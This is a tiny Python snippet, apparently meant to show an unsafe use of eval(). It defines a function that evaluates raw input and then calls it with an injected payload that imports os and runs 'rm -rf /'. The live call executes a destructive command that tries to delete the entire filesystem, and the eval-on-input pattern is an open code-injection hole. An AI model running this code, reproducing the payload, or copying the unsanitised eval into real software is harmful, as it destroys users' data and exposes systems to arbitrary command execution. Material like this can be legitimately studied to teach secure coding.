def unsafe_eval_func(user_input):
    result = eval(user_input)
    return result

unsafe_eval_func("__import__('os').system('rm -rf /')")
